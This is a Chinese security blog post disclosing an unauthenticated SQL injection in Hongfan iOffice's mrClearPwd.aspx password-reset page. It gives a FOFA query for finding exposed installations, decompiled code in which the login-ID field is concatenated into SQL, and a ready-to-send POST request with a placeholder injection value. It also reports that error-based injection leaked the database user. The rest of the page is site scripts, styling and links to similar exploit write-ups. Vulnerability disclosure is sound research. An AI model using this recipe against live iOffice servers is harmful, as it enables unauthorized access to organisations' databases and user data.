---
title: "红帆ioffice mrClearPwd.aspx SQL 注入漏洞"
source: https://mrxn.net/jswz/ioffice-ClearPwd-mrClearPwd-sqli.html
asset_dir: assets/红帆ioffice-mrclearpwd.aspx-sql-注入漏洞
---

# 红帆ioffice mrClearPwd.aspx SQL 注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/24 16:36
* 849浏览
* [0评论](#comment)
* 41分钟阅读

深入探索

在线安全工具

文件大小转换

VPN服务


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

红帆iOffice的/ioffice/prg/mr/ClearPwd/mrClearPwd.aspx接口存在[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞。攻击者可通过构造恶意SQL语句，未经身份验证地获取数据库敏感信息，影响范围包括红帆iOffice系统的数据访问权限。

SQL注入防护

# 影响版本

# fofa语法

> (title="iOffice.net" || body="/iOffice/js" || (body="iOffice.net" && header!="couchdb" && header!="drupal") || body="iOfficeOcxSetup.exe" || body="Hongfan. All Rights Reserved")

# 漏洞分析

先看下`mrClearPwd.aspx` 里引用的代码在哪里（Inherits）

深入探索

物流软件安全

云安全解决方案

编码转换工具

```
<%@ Page Language="vb" AutoEventWireup="false" CodeBehind="mrClearPwd.aspx.vb"
    Inherits="mr.mrClearPwd" %>
    <form id="frm" runat="server" defaultfocus="txtpwd"
    defaultbutton="ok">
    <div style="position: absolute; bottom: 3px; left: 15px;
        font-size: 13">
        <a href="../../../help/ioset.exe" title="IE设置工具">IE设置工具</a>&nbsp;&nbsp;
        <a href="../../../help/iOfficeOcxSetup.exe" title="文档控件安装">
            文档控件安装</a>
    </div>
```

去bin目录找到`mrClearPwd.dll`后编译打开，看`mrClearPwd`它的实现逻辑关键部分

代码安全审计

```
public class mrClearPwd : WebPageBase
{
private void cmdValidate_Click(object sender, EventArgs e)
{
  if (((CheckBox) this.rad1).Checked)
  {
    int num = 0;
    string str = "";
    if (Operators.CompareString(this.txtloginid.Text.Trim(), "", false) != 0)
    {
      DataTable baseInfExtent = mr.mr.GetBaseInfExtent(0, this.txtloginid.Text);
      if (baseInfExtent.Rows.Count > 0)
      {
        num = 1;
        str = baseInfExtent.Rows[0]["Question"].ToString();
      }
      else
        num = 0;
    }
    if (num == 1)
    {
      ((WebControl) this.txtAnswer).Attributes["contenteditable"] = "true";
      ((WebControl) this.txtQuestion).Attributes["contenteditable"] = "false";
      this.txtQuestion.Text = str;
      this.txtAnswer.Text = "";
      ((Control) this.lblTip).Visible = false;
    }
    else
    {
      ((WebControl) this.txtAnswer).Attributes["contenteditable"] = "false";
      ((WebControl) this.txtQuestion).Attributes["contenteditable"] = "false";
      this.txtQuestion.Text = "";
      this.txtAnswer.Text = "";
      ((Control) this.lblTip).Visible = true;
    }
  }
  if (((CheckBox) this.rad2).Checked)
  {
    if (Operators.CompareString(Globals.get_Profile("PwdPolicy", "ClearPwdNeedMobile"), "1", false) == 0)
    {
      if (Operators.CompareString(this.txtmobileNO.Text, "", false) == 0)
      {
        Page pgeParent = (Page) this;
        pf.ShowMessage(ref pgeParent, "必须输入您的手机号码（必须在系统中有登记）");
        this.ClientScript.RegisterStartupScript(this.ClientScript.GetType(), "CtlssTree1", "<script>DisableButton()</script>");
      }
      else if (Conversions.ToInteger(SqlData.ExecuteScalar(Globals.ConnectString, (CommandType) 1, $"select count(*) from mrBaseInf where loginid='{this.txtloginid.Text}' and ( mobile='{this.txtmobileNO.Text}' or mobile1='{this.txtmobileNO.Text}' or mobile2='{this.txtmobileNO.Text}')")) <= 0)
      {
        Page pgeParent = (Page) this;
        pf.ShowMessage(ref pgeParent, "手机号码不正确！（该号码在系统中未登记或与登记的号码不符！）");
        this.ClientScript.RegisterStartupScript(this.ClientScript.GetType(), "CtlssTree1", "<script>DisableButton()</script>");
      }
      else
      {
        this.SendVerifyCode();
        this.ClientScript.RegisterStartupScript(this.ClientScript.GetType(), "send", "<script>startTimer()</script>");
      }
    }
    else
    {
      this.SendVerifyCode();
      this.ClientScript.RegisterStartupScript(this.ClientScript.GetType(), "send", "<script>startTimer()</script>");
    }
  }
}
```

在通过“短信验证”方式找回密码时，用户名字段（`txtloginid`）未经任何过滤或参数化处理，被直接拼接到 SQL 查询语句中，导致了[SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)漏洞，攻击者可借此执行任意 SQL 命令。

漏洞扫描服务

# 漏洞复现

> 漏洞复现需要打开漏洞文件页面获取一些其他必要参数如\_\_VIEWSTATE之类

[![红帆ioffice mrClearPwd.aspx SQL 注入漏洞](images/img-001-d057883e4ca6.webp)](https://image.mrxn.net/738cc76b57244dddbdcbd752fcba4c35.webp)

```
POST /ioffice/prg/mr/ClearPwd/mrClearPwd.aspx HTTP/1.1
Host: ioffice.mrxn.net
Content-Type: application/x-www-form-urlencoded

__EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=YOUR__VIEWSTATE&__VIEWSTATEGENERATOR=YOUR___VIEWSTATEGENERATOR&txtloginid=SQLI_POC&grop1=rad2&txtmobileNO=1&txtmobile=13888888888&ok=%E7%A1%AE%E3%80%80%E8%AE%A4
```

[![红帆ioffice mrClearPwd.aspx SQL 注入漏洞](images/img-002-7b6b21836607.webp)](https://image.mrxn.net/94ef50e67dd044e58a569409241be4c3.webp)

成功利用[报错注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)在响应回显当前数据库用户信息

编程

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#0day](https://mrxn.net/tag/0day)
* [#asp.net](https://mrxn.net/tag/asp.net)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[红帆ioffice mrClearPwd.aspx SQL 注入漏洞](https://mrxn.net/jswz/ioffice-ClearPwd-mrClearPwd-sqli.html)  
文章链接：<https://mrxn.net/jswz/ioffice-ClearPwd-mrClearPwd-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/ioffice-ClearPwd-mrClearPwd-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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